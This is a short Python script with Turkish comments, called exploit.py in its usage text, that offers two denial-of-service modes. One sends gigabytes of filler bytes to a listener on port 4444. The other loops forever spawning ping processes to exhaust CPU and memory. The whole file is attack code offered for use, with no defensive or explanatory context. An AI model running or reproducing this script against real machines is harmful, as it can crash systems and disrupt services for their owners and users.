import socket
import sys
import subprocess

# Dinleyici IP ve Port
LHOST = '127.0.0.1'
LPORT = 4444

def send_large_data(size_in_gb):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    
    # Büyük veri parçası oluştur ve gönder
    large_data = b'A' * (size_in_gb * 1024 * 1024 * 1024)  # GB cinsinden veri
    s.sendall(large_data)
    
    s.close()
    print("Large data sent successfully.")

def overload_system():
    try:
        # CPU ve bellek tüketimini artır
        while True:
            subprocess.Popen(["ping", "-t", "localhost"])
    except Exception as e:
        print(f"Error: {e}")

def print_usage():
    print("Usage: exploit.py [--data | --overload] [size_in_gb]")
    print("--data <size_in_gb> : Send a large amount of data.")
    print("--overload         : Overload the system resources.")

def main():
    if len(sys.argv) < 2:
        print_usage()
        return

    option = sys.argv[1]
    
    if option == '--data':
        if len(sys.argv) != 3:
            print_usage()
            return
        try:
            size_in_gb = int(sys.argv[2])
            send_large_data(size_in_gb)
        except ValueError:
            print("Invalid size_in_gb value. Must be an integer.")
    elif option == '--overload':
        overload_system()
    else:
        print_usage()

if __name__ == "__main__":
    main()